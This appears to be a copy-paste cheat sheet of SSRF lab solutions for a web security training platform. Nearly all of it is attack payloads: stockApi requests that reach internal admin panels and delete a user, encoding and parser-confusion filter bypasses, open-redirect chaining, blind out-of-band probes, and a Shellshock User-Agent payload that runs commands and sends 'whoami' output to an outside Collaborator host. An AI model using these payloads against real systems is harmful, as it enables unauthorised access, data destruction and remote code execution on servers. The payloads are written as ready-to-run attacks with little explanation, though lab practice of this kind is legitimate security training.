---

## 🚀 SESSION-READY PAYLOADS (Using your Active Session)
*Direct copy-paste payloads using the IDs from your screenshot.*

| Lab Target | Session Payload |
| :--- | :--- |
| **Lab #2 (Internal Admin)** | `stockApi=http://192.168.0.185:8080/admin/delete?username=carlos` |
| **Lab #4 (Whitelist Bypass)** | `stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos` |
| **Lab #5 (Open Redirect)** | `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos` |
| **Lab #7 (Shellshock)** | `() { :; }; /usr/bin/nslookup $(whoami).kc067slx3scox245sijsfiohg8m0aqyf.oastify.com` |

---

## 📂 Table of Contents
1. [Basic SSRF (Local Server)](#1-basic-ssrf-local-server)
2. [Basic SSRF (Backend System)](#2-basic-ssrf-backend-system)
3. [Blacklist Bypass](#3-ssrf-with-blacklist-filter)
4. [Whitelist Bypass (Expert)](#4-ssrf-with-whitelist-filter-expert)
5. [Open Redirection Bypass](#5-ssrf-via-open-redirection)
6. [Blind SSRF (OAST)](#6-blind-ssrf-with-oast-detection)
7. [Blind SSRF (Shellshock RCE - Expert)](#7-blind-ssrf-with-shellshock-rce-expert)

---

## 1. Basic SSRF (Local Server)
**Lab:** *Basic SSRF against the local server*

| Action | Payload |
| :--- | :--- |
| **Enumerate Admin** | `stockApi=http://localhost/admin` |
| **Delete User** | `stockApi=http://localhost/admin/delete?username=carlos` |

---

## 2. Basic SSRF (Backend System)
**Lab:** *Basic SSRF against another back-end system*

| Action | Payload |
| :--- | :--- |
| **Internal Scan** | Intruder scan `1-255` on: `stockApi=http://192.168.0.X:8080/admin` |
| **Delete User** | `stockApi=http://192.168.0.X:8080/admin/delete?username=carlos` |

---

## 3. SSRF with Blacklist Filter
**Lab:** *SSRF with blacklist-based input filter*

| Vector | Payload |
| :--- | :--- |
| **IP Bypass** | `stockApi=http://127.1` (or `http://2130706433`) |
| **Keyword Bypass** | `stockApi=http://127.1/%2561dmin/delete?username=carlos` |
| **Note** | `%2561` is double-encoded 'a' to bypass input validation filters. |

---

## 4. SSRF with Whitelist Filter (Expert)
**Lab:** *SSRF with whitelist-based input filter*

| Vector | Payload |
| :--- | :--- |
| **Parser Confusion** | `stockApi=http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos` |
| **Logic** | The filter validates `stock.weliketoshop.net` but the parser treats `%2523` (#) as a fragment, resolving the authority to `localhost`. |

---

## 5. SSRF via Open Redirection
**Lab:** *SSRF with filter bypass via open redirection vulnerability*

| Action | Payload |
| :--- | :--- |
| **Chain Redirect** | `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos` |
| **Note** | Uses an approved local endpoint (`/product/nextProduct`) to redirect the server's internal requester to the private backend. |

---

## 6. Blind SSRF with OAST Detection
**Lab:** *Blind SSRF with out-of-band detection*

| Header | Value |
| :--- | :--- |
| **Referer** | `Referer: http://[YOUR-COLLABORATOR-ID].oastify.com` |
| **Detection** | Confirm DNS/HTTP interaction in Burp Collaborator client. |

---

## 7. Blind SSRF with Shellshock RCE (Expert)
**Lab:** *Blind SSRF with Shellshock exploitation*

**Step 1: Discover Internal IP**
- Set `Referer: http://192.168.0.X:8080`
- Intruder scan `X` (1-255) to find valid internal host.

**Step 2: Execute Shellshock**
- **Target Header**: `User-Agent` (forwarded to internal host)
- **Payload**:
  ```bash
  User-Agent: () { :; }; /usr/bin/nslookup $(whoami).[YOUR-COLLABORATOR-ID].oastify.com
  ```

---

> [!IMPORTANT]
> Always replace `[X]`, `[YOUR-COLLABORATOR-ID]`, and `[YOUR-LAB-ID]` with your specific session variables. Correct URL encoding is critical for expert-level parser bypasses.
